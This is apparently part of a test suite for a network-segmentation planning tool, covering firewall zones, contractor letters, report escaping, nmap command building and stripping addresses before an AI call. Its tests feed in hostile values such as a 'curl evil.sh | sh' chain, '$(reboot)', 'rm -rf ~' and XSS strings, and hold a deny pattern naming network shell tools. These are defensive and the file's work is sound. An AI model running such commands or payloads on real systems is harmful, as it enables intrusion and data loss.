  assert.strictEqual(new Set(a.plan.zones.map((z) => z.vlan)).size, a.plan.zones.length);
  const z = (name) => a.plan.zones.find((x) => x.name === name).devices.map((id) => a.byId[id]);
  assert.ok(z('Building & OT').every((d) => C.ROLES[d.cls.role].ot) && z('Building & OT').length === 8);
  assert.ok(z('Payments').every((d) => d.cls.role === 'pos'));
  assert.ok(z('Guest').some((d) => d.cls.role === 'unknown'), 'unknowns wait in Guest');
  const last = a.rules[a.rules.length - 1];
  assert.deepStrictEqual([last.from, last.to, last.action], ['Any zone', 'Any other zone', 'Deny']);
  const otName = 'Building & OT';
  assert.ok(!a.rules.some((r) => r.from.startsWith(otName) && r.to.startsWith('Payments') && /^Allow/.test(r.action)), 'nothing allowed from OT to Payments');
  assert.ok(a.rules.some((r) => r.from === otName && r.to === 'Payments' && r.action === 'Deny'), 'and it is said explicitly');
  assert.ok(!a.rules.some((r) => r.from.startsWith('Guest') && /^Allow/.test(r.action) && r.to !== 'Internet'));
  for (const r of a.rules.filter((x) => /^Allow/.test(x.action))) assert.ok(r.service && r.service !== '-' && !/^any$/i.test(r.service), `an allow names its service: ${JSON.stringify(r)}`);
  const pay = a.rules.find((r) => r.from === 'Payments' && r.to === 'Internet');
  assert.match(pay.service, /443.*processor/);
  const vpn = a.rules.find((r) => r.from.startsWith('VPN'));
  for (const p of D.planted.otPorts) assert.ok(vpn.service.includes(p), `the VPN rule names ${p}`);
  assert.ok(!/23\/tcp|3389|5938/.test(vpn.service), 'no Telnet or remote control through the VPN');
  // A network already in 10.10 gets a scheme that cannot clash.
  const clash = C.analyse([xml([{ ip: '10.10.20.5', mac: M(5), vendor: 'Verifone' }], 'nmap 10.10.20.0/24')]);
  assert.ok(clash.plan.zones.every((x) => x.subnet.startsWith('172.16.')));
  assert.ok(C.STEPS.gear.every((g) => g.steps.length >= 3) && C.STEPS.gear.filter((g) => g.id !== 'generic').every((g) => g.steps.some((s) => /vary by version/.test(s))));
});

test('the letter and the checklist name this network\u2019s ports, devices and asks; letter fields are one clean line each', () => {
  const a = demo();
  const L = C.letter(a.devices, a.plan, D.letterFields);
  for (const p of D.planted.otPorts) assert.ok(L.includes(p), `letter names ${p}`);
  assert.ok(L.includes('VLAN 30, 10.10.30.0/24') && L.includes('Hello Northside Refrigeration & HVAC,') && L.includes('Dana Ruiz, Store IT'));
  for (const ip of D.planted.telnet) assert.ok(L.includes(ip), `Telnet on ${ip} is raised`);
  assert.ok(/airlink-lx40 at 192\.168\.1\.90/.test(L) && /port forwards/.test(L) && /do not install another modem or router/.test(L));
  assert.ok(/alarms reach you/.test(L), 'asks how alarms reach them');
  assert.ok(/cannot reach our payment devices/.test(L));
  const list = C.checklist(a.devices);
  assert.ok(list.length >= 8);
  const ports = list.find((c) => c.id === 'ports').text;
  for (const p of D.planted.otPorts) assert.ok(ports.includes(p));
  assert.match(list.find((c) => c.id === 'paths').text, /we found 1 box/);
  assert.ok(list.some((c) => /test alarm/.test(c.text)) && list.some((c) => /Default passwords/.test(c.text)));
  const hostile = C.letter(a.devices, a.plan, { business: 'Shop\nBcc: x@y.z\u202E', contractor: '<b>Bob</b>', you: 'A'.repeat(500) });
  assert.ok(!/\u202E/.test(hostile) && hostile.includes('Shop Bcc: x@y.z') && hostile.split('\n').some((l) => l.length <= 81 && l.startsWith('AAAA')));
  // Plain text for a textarea: it is never HTML, and the page escapes it.
  assert.ok(!/<(p|br|div)\b/.test(L));
});

/* ---------------- exports ---------------- */

test('exports: Markdown and JSON carry devices, evidence, findings, zones and rules; hostile strings cannot become markup or links', () => {
  const evil = { ip: '192.168.1.66', mac: M(66), vendor: 'Danfoss | <img src=x onerror=alert(1)>', name: '[click](javascript:alert(1))\u202E', ports: [[80, 'tcp', 'http', '`code`', '# heading <script>alert(1)</script>']] };
  const a = analyse([evil, { ip: '192.168.1.21', mac: M(21), vendor: 'Verifone' }]);
  const md = C.toMarkdown(a, { date: '2026-10-15', title: 'Shop **bold**', notes: { [a.devices[0].id]: 'note <b>x</b> | y' } });
  assert.ok(!/<img|<script|<b>/i.test(md), 'no raw markup');
  assert.ok(!/\[click\]\(javascript/.test(md), 'no link');
  assert.ok(!/\u202E/.test(md));
  assert.ok(md.includes('Shop \\*\\*bold\\*\\*'));
  assert.ok(/\| `192\.168\.1\.66` \| `00:00:5e:00:53:42` \| Danfoss \\\| &lt;img/.test(md), 'a pipe in a vendor cannot break the table');
  assert.ok(md.includes('## Firewall rules between zones') && md.includes('## Proposed zones') && md.includes('not legal or compliance advice') && md.includes('## Your notes'));
  const j = JSON.parse(C.toJson(a, { date: '2026-10-15', notes: {} }));
  assert.deepStrictEqual(Object.keys(j).sort(), ['devices', 'findings', 'generated', 'inputs', 'plan', 'tool', 'verdict']);
  const d0 = j.devices.find((d) => d.ip === '192.168.1.66');
  assert.ok(d0.mac && d0.vendor && d0.role === 'refrigeration' && d0.evidence.length && d0.zone === 'ot' && d0.ports[0].port === 80);
  assert.ok(j.findings[0].devices.includes('192.168.1.66') && j.plan.rules.length && j.plan.zones.length);
  // The example's report.
  const dm = C.toMarkdown(demo(), { date: 'x' });
  assert.ok(dm.includes(D.planted.headline) && (dm.match(/^\| `192\.168\.1\./gm) || []).length === 45);
});

test('hostile strings are cleaned when read and escaped when drawn', () => {
  const h = '<img src=x onerror=alert(1)>\u202Eevil\u200B\u0007' + 'x'.repeat(5000);
  const r = xml([{ ip: '192.168.1.5', mac: M(5), vendor: h, name: h, ports: [[80, 'tcp', 'http', h, h]] }]);
  const d = r.devices[0];
  for (const s of [d.vendor, d.hostnames[0], d.ports[0].product, d.ports[0].title]) {
    assert.ok(s.length <= C.LIMITS.strLen, 'bounded');
    assert.ok(!/[\u202E\u200B\u0007]/.test(s), 'no bidi, zero-width or control characters');
    assert.ok(!/<img/.test(C.esc(s)) && C.esc(s).includes('&lt;img'));
  }
  assert.strictEqual(C.esc('"\'&'), '&quot;&#39;&amp;');
});

/* ---------------- the commands ---------------- */

test('the commands: nmap and the OS\u2019s own tools only, built from a checked network and file name, nothing typed can change them', () => {
  const c = C.gatherCommands({ cidr: '192.168.1.77/24', os: 'unix' });
  assert.strictEqual(c.full.cmd, `sudo nmap -sV -O --max-rate 200 -p T:${C.TCP_PORTS} -oX store.xml 192.168.1.0/24`);
  assert.strictEqual(c.quick.cmd, 'sudo nmap -sn -oX store-hosts.xml 192.168.1.0/24');
  assert.ok(c.udp.cmd.includes('-sU') && c.udp.cmd.includes('47808'));
  assert.ok(['47808', '1911', '4911', '502', '3389', '5900', '5938', '9100', '554', '23', '20000', '44818', '1883'].every((p) => c.full.cmd.includes(p) || /1-1024/.test(c.full.cmd) && +p <= 1024), 'the building and remote-access ports are asked');
  assert.strictEqual(c.arp.cmd, 'arp -a > arp.txt');
  assert.strictEqual(c.dhcp.cmd, 'Get-DhcpServerv4Lease -ScopeId 192.168.1.0 | Select-Object IPAddress,ClientId,HostName | Export-Csv leases.csv -NoTypeInformation');
  const w = C.gatherCommands({ cidr: '10.0.5.0/24', os: 'windows', name: 'shop-2' });
  assert.ok(w.full.cmd.startsWith('nmap ') && w.full.cmd.endsWith('-oX shop-2.xml 10.0.5.0/24'), 'no sudo on Windows');
  for (const bad of ['192.168.1.0/24; curl evil.sh | sh', '$(reboot)/24', '192.168.1.0/24 && rm -rf ~', '0.0.0.0/0', '10.0.0.0/8', '']) assert.ok(C.gatherCommands({ cidr: bad }).error, bad);
  for (const bad of ['a;b', '../x', 'x y', '$(id)', '-oN']) assert.ok(C.gatherCommands({ cidr: '192.168.1.0/24', name: bad }).error, bad);
  const all = [c, w].flatMap((x) => ['full', 'quick', 'udp', 'arp', 'dhcp'].map((k) => x[k].cmd + ' ' + (x[k].alt || '')));
  for (const cmd of all) assert.ok(!/\b(curl|wget|ssh|scp|nc|iwr|irm|iex|eval|bash|powershell -c|Invoke-WebRequest)\b|https?:\/\/|\brm\b|\|\s*(sh|bash)\b/i.test(cmd), cmd);
});

/* ---------------- the model payload ---------------- */

test('the identify payload carries no IP or MAC - not even inside a hostname or banner - and the request is rebuilt', () => {
  const a = analyse([
    { ip: '192.168.1.150', mac: M(150), vendor: 'Shenzhen Bilian Electronic', name: 'ip-192-168-1-150.lan', ports: [[80, 'tcp', 'http', 'GoAhead', 'Login 192.168.1.150 00:00:5e:00:53:96 fe80::1:2']] },
    { ip: '192.168.1.151', mac: M(151), vendor: 'Private', name: '00005e005397', ports: [[10001, 'tcp', 'scp-config']] },
  ]);
  const p = C.identifyPayload(a, a.devices.map((d) => d.id));
  const s = JSON.stringify(p.body);
  assert.ok(!/192\.168|00:00:5e|00005e|fe80/i.test(s), s);
  assert.deepStrictEqual(Object.keys(p.body.devices[0]).sort(), ['hostnames', 'os', 'privateAddress', 'ref', 'services', 'vendor']);
  assert.deepStrictEqual(p.refs, { d1: a.devices[0].id, d2: a.devices[1].id });
  assert.deepStrictEqual(p.body.devices[1].hostnames, [], 'a hostname that was only an address is dropped');
  const demoPay = C.identifyPayload(demo(), demo().devices.filter((d) => d.cls.role === 'unknown').map((d) => d.id));
  assert.ok(!/192\.168|00:00:5e/i.test(JSON.stringify(demoPay.body)));
  // The server side rebuilds: extra fields, IPs in strings, bad refs.
  const req = C.cleanIdentifyRequest({ devices: [{ ref: 'd1', vendor: 'Danfoss 10.1.2.3', ip: '10.1.2.3', mac: 'aa:bb:cc:dd:ee:ff', hostnames: ['x', 5], services: [{ port: 80, proto: 'tcp', title: 'aa:bb:cc:dd:ee:ff', raw: 'SCAN' }, { port: 70000 }] }], scan: '<nmaprun>' });
  assert.deepStrictEqual(req, { devices: [{ ref: 'd1', vendor: 'Danfoss [address]', hostnames: ['x'], services: [{ port: 80, proto: 'tcp', service: '', product: '', title: '[address]' }], os: '', privateAddress: false }] });
  for (const bad of [null, {}, { devices: [] }, { devices: Array(13).fill({ ref: 'd1' }) }, { devices: [{ ref: 'x' }] }, { devices: [{ ref: 'd1' }, { ref: 'd1' }] }, { devices: [{ ref: 'd1' }] }]) assert.strictEqual(C.cleanIdentifyRequest(bad), null, JSON.stringify(bad).slice(0, 60));
  const out = C.cleanIdentification({ devices: [{ ref: 'd1', role: 'camera', confidence: 'certain', why: '<b>x</b>\u202E' + 'y'.repeat(900), check: 'look' }, { ref: 'd9', role: 'pos', why: 'w' }, { ref: 'd2', role: 'toaster', why: 'w' }, { ref: 'd2', role: 'pos', why: '' }] }, { d1: 1, d2: 1 });
  assert.strictEqual(out.devices.length, 1);
  assert.ok(out.devices[0].confidence === 'low' && out.devices[0].why.length <= 400 && !/[<>\u202E]/.test(out.devices[0].why));
  assert.strictEqual(C.cleanIdentification({ devices: [] }, {}), null);
});

/* ---------------- the page ---------------- */

function luminance(hex) {
  const n = hex.replace('#', '');
  return [0, 2, 4].map((i) => parseInt(n.slice(i, i + 2), 16) / 255).map((c) => (c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4)).reduce((s, c, i) => s + c * [0.2126, 0.7152, 0.0722][i], 0);
}
const ratio = (a, b) => { const [x, y] = [luminance(a), luminance(b)].sort((p, q) => q - p); return (x + 0.05) / (y + 0.05); };

test('every text colour holds 4.5:1 on its surface in both themes; tap targets 44px; tables and commands scroll in their own box', () => {
  const css = fs.readFileSync(path.join(ROOT, 'public', 'app.css'), 'utf8');
  const block = (re) => { const m = re.exec(css); assert.ok(m, String(re)); const out = {}; for (const [, k, v] of m[1].matchAll(/--([a-z0-9-]+):\s*(#[0-9a-f]{6})/gi)) out[k] = v; return out; };
  const light = block(/^:root \{([\s\S]*?)\n\}/m);
  const dark = block(/:root:not\(\[data-theme="light"\]\) \{([\s\S]*?)\n {2}\}/);
  const forced = block(/:root\[data-theme="dark"\] \{([\s\S]*?)\n\}/);
  assert.deepStrictEqual(forced, dark, 'the forced dark theme matches the automatic one');
  for (const [name, t] of [['light', light], ['dark', dark]]) {
    for (const bg of ['bg', 'card', 'card2', 'code-bg', 'accent-soft']) for (const fg of ['text', 'muted', 'link']) assert.ok(ratio(t[fg], t[bg]) >= 4.5, `${name} ${fg} on ${bg}: ${ratio(t[fg], t[bg]).toFixed(2)}`);
    assert.ok(ratio(t['accent-ink'], t.accent) >= 4.5, `${name} accent-ink on accent`);
    for (const k of ['high', 'med', 'low', 'info', 'ok']) {
      assert.ok(ratio(t[k], t[k + '-bg']) >= 4.5, `${name} ${k} pill: ${ratio(t[k], t[k + '-bg']).toFixed(2)}`);
      assert.ok(ratio(t.text, t[k + '-bg']) >= 4.5, `${name} text on ${k}-bg`);
      assert.ok(ratio(t[k], t.card) >= 4.5, `${name} ${k} as text on a card (issue counts, allow/deny): ${ratio(t[k], t.card).toFixed(2)}`);
    }
    assert.ok(ratio(t.high, t.bg) >= 4.5, `${name} an error message`);
    assert.ok(ratio(t['strip-ink'], t.strip) >= 4.5 && ratio(t['strip-muted'], t.strip) >= 4.5 && ratio(t['strip-btn-ink'], t['strip-btn']) >= 4.5, `${name} the strip`);
    assert.ok(ratio(t.bg, t.text) >= 4.5, `${name} toast (inverted)`);
    assert.ok(ratio(t.card, t.high) >= 4.5, `${name} a tab badge`);
    assert.ok(ratio(t.bg, t.text) >= 4.5 && ratio(t.card, t.text) >= 4.5, `${name} a pressed segment`);
    for (const z of ['payments', 'office', 'ot', 'cameras', 'guest', 'mgmt']) assert.ok(ratio(t['z-' + z], t.card) >= 3, `${name} zone ${z} as an edge mark (names are always written too)`);
  }
  // The hero is the same in both themes.
  for (const [fg, bg] of [['#ffffff', '#111827'], ['#ffffff', '#4a1d06'], ['#dbe4ee', '#1c2433'], ['#dbe4ee', '#4a1d06'], ['#ffc499', '#111827'], ['#ffc499', '#1c2433'], ['#2a1200', '#ffb15c'], ['#f1f5f9', '#1c2433']]) assert.ok(ratio(fg, bg) >= 4.5, `hero ${fg} on ${bg}: ${ratio(fg, bg).toFixed(2)}`);
  assert.ok(/\.btn \{[^}]*min-height: 44px/.test(css) && /\.segb \{[^}]*min-height: 44px/.test(css) && /\.link-btn \{[^}]*min-height: 44px/.test(css) && /\.devchip \{[^}]*min-height: 44px/.test(css) && /\.drow \{[^}]*min-height: 60px/.test(css) && /\.checks label \{[^}]*min-height: 44px/.test(css), '44px tap targets');
  assert.ok(/\.tablebox \{[^}]*overflow-x: auto/.test(css) && /\.cmd pre \{[^}]*overflow-x: auto/.test(css) && /pre\.sent \{[^}]*overflow: auto/.test(css), 'wide things scroll in their own box');
  assert.ok(/table\.stack td::before \{[^}]*content: attr\(data-label\)/.test(css), 'the rule table stacks on a phone');
  assert.ok(/body \{[^}]*overflow-x: hidden/.test(css));
  assert.ok(/@media print/.test(css), 'a printable report');
});

test('the page: relative links, no inline script or handlers, the banner, storage wrapped, only known requests, nothing after a response', () => {
  const html = fs.readFileSync(path.join(ROOT, 'public', 'index.html'), 'utf8');
  assert.ok(!/<script(?![^>]*\bsrc=)[^>]*>/i.test(html), 'no inline <script>');
  assert.ok(!/\son[a-z]+\s*=/i.test(html), 'no inline handlers');
  assert.ok(html.includes('<script src="verify-banner.js" data-mount="api/auth" defer></script>'));
  assert.ok(html.includes('<link rel="stylesheet" href="desktop.css">') && html.includes('<script src="passkey-client.js"></script>') && html.includes('<body class="dk">'));
  assert.ok(!/(src|href)="\//.test(html), 'relative asset links only');
  const js = fs.readFileSync(path.join(ROOT, 'public', 'app.js'), 'utf8');
  assert.ok(!/\son[a-z]+=\\?["']/.test(js), 'no handler written into markup');
  assert.ok(!/\.on(click|submit|change|input|load|error) =/.test(js), 'handlers by addEventListener');
  assert.ok(/localStorage\.getItem[^\n]*\} catch/.test(js) && /localStorage\.setItem[^\n]*\} catch/.test(js), 'every storage access is wrapped');
  assert.strictEqual((js.match(/localStorage\./g) || []).length, 3, 'and there are no others');
  assert.ok(!/sessionStorage|indexedDB/.test(js));
  assert.ok(!/fetch\(['"]\//.test(js) && !/href="\//.test(js), 'every browser URL is relative to BASE');
  const calls = [...js.matchAll(/api\('(GET|POST)', '([^']+)'/g)].map((m) => m[2]);
  assert.deepStrictEqual([...new Set(calls)].sort(), ['api/auth/', 'api/auth/billing', 'api/auth/logout', 'api/identify', 'api/me'], 'the page asks for nothing else - no route takes a scan');
  assert.ok(/var p = payload\(\);/.test(js) && /C\.identifyPayload\(a, /.test(js) && /api\('POST', 'api\/identify', p\.body\)/.test(js), 'identify sends the payload it showed');
  assert.ok(/id="idPayload"/.test(js), 'the payload is shown before sending');
  assert.ok(!/[a-z0-9._-]+@[a-z0-9-]+\.[a-z]{2,}/i.test(html + js), 'no email address in the page');
  for (const f of ['public/zoned-core.js', 'public/demo.js']) assert.ok(!/\bfetch\(|new XMLHttpRequest|localStorage\.|sessionStorage\.|indexedDB\./.test(fs.readFileSync(path.join(ROOT, f), 'utf8')), `${f} touches no network or storage`);
  const server = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  assert.ok(!/setInterval|setTimeout/.test(server), 'nothing runs after a response (billed per request)');
  assert.ok(!/child_process|\bnet\b|\bdgram\b|require\('dns'\)|require\('http'\)|\.connect\(/.test(server), 'the server cannot scan or connect anywhere');
  for (const f of ['server.js', 'lib/ai.js', 'public/zoned-core.js']) {
    const src = fs.readFileSync(path.join(ROOT, f), 'utf8');
    assert.ok(!/console\.(log|error|warn)\([^)]*(req\.body|payload|sent|raw|devices)/.test(src), `${f} logs a body`);
  }
});

test('local-only switches throw on Cloud Run; the lab prefix is read', () => {
  for (const [mod_, env] of [['./lib/store', { ZONED_MEMORY: '1' }], ['./lib/fakeai', { ZONED_FAKE_AI: '1' }], ['./server', { ZONED_FAKE_AI: '1', ZONED_MEMORY: '' }]]) {
    const r = spawnSync(process.execPath, ['-e', `require(${JSON.stringify(mod_)})`], { cwd: ROOT, env: { ...process.env, ZONED_MEMORY: '', ZONED_FAKE_AI: '', ...env, K_SERVICE: 'challenge' }, encoding: 'utf8' });
    assert.notStrictEqual(r.status, 0, `${mod_} loaded on Cloud Run`);
    assert.ok(/refused on Cloud Run/.test(r.stderr), r.stderr.slice(0, 300));
  }
  const prefix = spawnSync(process.execPath, ['-e', 'console.log(require("./lib/store").PREFIX)'], { cwd: ROOT, env: { ...process.env, ZONED_COLLECTION_PREFIX: 'zoned_' }, encoding: 'utf8' });
  assert.strictEqual(prefix.stdout.trim(), 'zoned_');
});

/* ---------------- over HTTP ---------------- */

let base;
let ip6 = 1;
function client() {
  const cookies = {};
  const addr = `2001:db8:${(ip6++).toString(16)}::1`;
  return async function call(method, p, body, headers = {}) {
    const cookie = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
    const res = await fetch(base + p, {
      method,
      headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': addr, ...(cookie ? { Cookie: cookie } : {}), ...headers },
      body: body === undefined ? undefined : (typeof body === 'string' ? body : JSON.stringify(body)),
    });
    for (const c of (res.headers.getSetCookie ? res.headers.getSetCookie() : [])) {
      const [kv] = c.split(';');
      const i = kv.indexOf('=');
      cookies[kv.slice(0, i)] = kv.slice(i + 1);
    }
    const t = await res.text();
    let data = {};
    try { data = JSON.parse(t); } catch (e) { data = { text: t }; }
    return { status: res.status, data, text: t, headers: res.headers };
  };
}
async function register(email) {
  const c = client();
  const r = await c('POST', '/api/auth/register', { email, password: 'a long enough password' });
  assert.strictEqual(r.status, 200, JSON.stringify(r.data));
  return c;
}
const uidOf = (email) => Buffer.from(email).toString('base64url');
const modelCalls = async () => (await identityStore.list('usage')).length;
const settle = () => new Promise((r) => setTimeout(r, 15));
const demoPayload = () => { const a = demo(); return C.identifyPayload(a, a.devices.filter((d) => d.cls.role === 'unknown').map((d) => d.id)).body; };
const BIG = { devices: [{ ref: 'd1', vendor: 'x'.repeat(100 * 1024) }] };
const SCAN_TEXT = D.files()[0].text;

test('signed out: the page works with zero model calls; identify answers 401 before reading any body; there is no route for a scan', async () => {
  const anon = client();
  const before = await modelCalls();
  assert.strictEqual((await anon('GET', '/healthz')).data.ok, true);
  const meta = (await anon('GET', '/api/meta')).data;
  assert.ok(meta.roles.includes('refrigeration') && meta.zones.includes('ot'));
  for (const f of ['zoned-core.js', 'demo.js', 'app.js', 'app.css', 'verify-banner.js', 'passkey-client.js', 'desktop.css', 'icon.svg', 'manifest.webmanifest']) assert.strictEqual((await fetch(`${base}/${f}`)).status, 200, f);
  const page = await fetch(`${base}/`);
  assert.match(page.headers.get('content-security-policy'), /script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors/);
  assert.strictEqual(page.headers.get('x-content-type-options'), 'nosniff');
  assert.strictEqual((await anon('GET', '/api/me')).data.signedIn, false);
  assert.strictEqual((await anon('POST', '/api/identify', demoPayload())).status, 401);
  assert.strictEqual((await anon('POST', '/api/identify', BIG)).status, 401, 'the gate answers before the parser, so not 413');
  for (const p of ['/api/upload', '/api/scan', '/api/devices', '/api/analyse', '/api/report', '/api/nmap', '/api/leases', '/api/ping']) assert.strictEqual((await anon('POST', p, { scan: 'x' })).status, 404, `${p}: there is no route for a scan`);
  assert.strictEqual((await anon('POST', '/api/auth/login', { email: 'x'.repeat(20 * 1024) })).status, 413, 'every other route keeps a small limit');
  await settle();
  assert.strictEqual(await modelCalls(), before, 'no model call for a signed-out visitor');
});

test('the metered route: requireUser, requireBudget, requireDailyCap, THEN its parser; one model client call in the server', () => {
  const layer = app._router.stack.find((l) => l.route && l.route.path === '/api/identify' && l.route.methods.post);
  assert.deepStrictEqual(layer.route.stack.map((l) => l.handle.name || '(anon)').slice(0, 4), ['requireUser', 'requireBudget', 'requireDailyCap', 'jsonParser']);
  const src = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  assert.strictEqual((src.match(/await clientFor\(req\)/g) || []).length, 1, 'one metered call, nowhere else');
  assert.match(src, /MODELS = \{ free: 'claude-haiku-4-5', paid: 'claude-sonnet-5' \}/);
  assert.match(src, /identityLib\.planFor\(req\.user, MODELS\)/);
  assert.match(src, /express\.json\(\{ limit: '64kb' \}\)/);
  assert.match(ai.SYSTEM, /untrusted data/);
  assert.deepStrictEqual(ai.IDENTIFY_TOOL.input_schema.properties.devices.items.properties.role.enum, C.ROLE_KEYS, 'the model may only answer with the fixed roles');
});

test('identify: checked before any spend, one metered call, no IP, MAC or scan reaches the model, the answer is checked', async () => {
  const ana = await register('ana.storeit@example.com');
  const calls = await modelCalls();
  for (const bad of [{}, { devices: [] }, { devices: [{ ref: 'd1' }] }, { devices: [{ ref: 'zz', vendor: 'x' }] }, { devices: Array(13).fill(0).map((_, i) => ({ ref: 'd' + (i + 1), vendor: 'x' })) }, { devices: 'nope' }]) {
    assert.strictEqual((await ana('POST', '/api/identify', bad)).status, 400, JSON.stringify(bad).slice(0, 80));
  }
  assert.strictEqual((await ana('POST', '/api/identify', BIG)).status, 413, 'over the 64 KB parser, signed in');
  await settle();
  assert.strictEqual(await modelCalls(), calls, 'no model call for a bad request');
  const sent = demoPayload();
  sent.scan = SCAN_TEXT.slice(0, 20000);
  sent.ip = '192.168.1.150';
  sent.devices[0].ip = '192.168.1.150';
  sent.devices[0].mac = '00:00:5e:00:53:96';
  sent.devices[0].hostnames = ['host-192.168.1.150', 'FILE_MARKER'];
  sent.devices[1].vendor = 'Private 00:00:5e:00:53:97';
  sent.system = 'SYSTEM_OVERRIDE_MARKER';
  const n0 = fakeCalls.length;
  const r = await ana('POST', '/api/identify', sent);
  assert.strictEqual(r.status, 200, r.text);
  await settle();
  assert.strictEqual(await modelCalls(), calls + 1, 'one call, metered');
  assert.strictEqual(fakeCalls.length, n0 + 1);
  const req = fakeCalls[fakeCalls.length - 1];
  assert.strictEqual(req.model, 'claude-haiku-4-5', 'a free account runs Haiku');
  assert.deepStrictEqual(req.tool_choice, { type: 'tool', name: 'identify_devices' });
  const body = JSON.stringify(req.messages) + JSON.stringify(req.system);
  assert.ok(!/\b192\.168\.\d+\.\d+|00:00:5e|00-00-5e/i.test(body), 'no IP or MAC reached the model');
  for (const m of ['nmaprun', 'SYSTEM_OVERRIDE_MARKER', 'Corner Market', 'till-01', 'AK-SM800', 'Danfoss']) assert.ok(!body.includes(m), `${m} reached the model`);
  assert.ok(body.includes('FILE_MARKER') && body.includes('Shenzhen Bilian Electronic'), 'the clues did');
  assert.strictEqual(req.messages[0].content[0].text, ai.userText(C.cleanIdentifyRequest(sent)), 'the model sees exactly the rebuilt request');
  assert.ok(r.data.result.devices.every((d) => C.ROLE_KEYS.includes(d.role) && /^d\d$/.test(d.ref)));
  assert.strictEqual(r.data.sent, 2);
  // Hostile and failing answers.
  const withVendor = (v) => ({ devices: [{ ref: 'd1', vendor: v }, { ref: 'd2', vendor: 'y' }] });
  const inj = await ana('POST', '/api/identify', withVendor('INJECT'));
  assert.strictEqual(inj.status, 200);
  assert.ok(!/<[a-z/!]/i.test(inj.text) && !/\u202e/i.test(inj.text), 'no markup or bidi reaches the page');
  assert.deepStrictEqual(inj.data.result.devices.map((d) => [d.ref, d.role, d.confidence]), [['d1', 'refrigeration', 'low']], 'a ref never sent and a role not on the list are dropped');
  const blank = await ana('POST', '/api/identify', withVendor('BLANK'));
  assert.deepStrictEqual([blank.status, /nothing usable/.test(blank.data.error)], [422, true]);
  assert.match((await ana('POST', '/api/identify', withVendor('MAXTOKENS'))).data.error, /ran long/);
  const up = await ana('POST', '/api/identify', withVendor('UPSTREAM401'));
  assert.ok(up.status === 502 && up.data.error && !/fake_upstream|stand-in/.test(up.text), 'a provider error is not passed on');
  const busy = await ana('POST', '/api/identify', withVendor('UPSTREAM529'));
  assert.deepStrictEqual([busy.status, /AI is busy/.test(busy.data.error)], [503, true]);
});

test('an unconfirmed free account gets the verify-email 403 before any model call or big body; out of credit is a 402, not a 413', async () => {
  const eve = await register('eve.unconfirmed@example.com');
  process.env.REQUIRE_VERIFIED_FOR_FREE_AI = '1';
  try {
    const calls = await modelCalls();
    const r = await eve('POST', '/api/identify', demoPayload());
    assert.deepStrictEqual([r.status, r.data.code], [403, 'verify-email']);
    assert.strictEqual(r.data.resend, '/zoned/api/auth/verify/send', 'the resend link is under this app\u2019s mount');
    assert.strictEqual((await eve('POST', '/api/identify', BIG)).status, 403, '403 before the big body is read');
    await settle();
    assert.strictEqual(await modelCalls(), calls);
  } finally { process.env.REQUIRE_VERIFIED_FOR_FREE_AI = '0'; }
  const cal = await register('cal.broke@example.com');
  await identityStore.merge('users', uidOf('cal.broke@example.com'), { spentUsd: 100 });
  const calls = await modelCalls();
  assert.strictEqual((await cal('POST', '/api/identify', demoPayload())).status, 402);
  assert.strictEqual((await cal('POST', '/api/identify', BIG)).status, 402, '402, not 413');
  await settle();
  assert.strictEqual(await modelCalls(), calls);
});

test('nothing is stored server-side: no scan, device, address or answer - only the shared account and its usage rows', async () => {
  const dump = identityStore._dump();
  for (const m of ['192.168.1.', '00:00:5e', 'Danfoss', 'Shenzhen Bilian', 'identify_devices', 'FILE_MARKER', 'stand-in answer', 'nmaprun']) assert.ok(!dump.includes(m), `${m} was stored: ${dump.slice(Math.max(0, dump.indexOf(m) - 200), dump.indexOf(m) + 60)}`);
  const cols = JSON.parse(dump).map(([p]) => p).sort();
  assert.ok(cols.every((c) => ['users', 'usage', 'events', 'control'].some((k) => c.toLowerCase().includes(k))), `only account collections: ${cols.join(', ')}`);
  const src = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  assert.ok(!/require\('\.\/lib\/store'\)\.store|store\.(set|merge|add|transact)\(/.test(src), 'the server has no app store to write to');
});

/* ---------------- run ---------------- */

(async () => {
  const hostApp = express();
  hostApp.set('trust proxy', 1);
  hostApp.use('/zoned', app);
  const server = http.createServer(hostApp).listen(0);
  await new Promise((r) => server.once('listening', r));
  base = `http://127.0.0.1:${server.address().port}/zoned`;
  let failed = 0;
  for (const t of tests) {
    try { await t.fn(); console.log(`  ok  ${t.name}`); } catch (err) { failed++; console.log(`  FAIL ${t.name}\n       ${err.stack.split('\n').slice(0, 8).join('\n       ')}`); }
  }
  server.close();
  console.log(`\n${tests.length - failed}/${tests.length} passed`);
  process.exit(failed ? 1 : 0);
})();
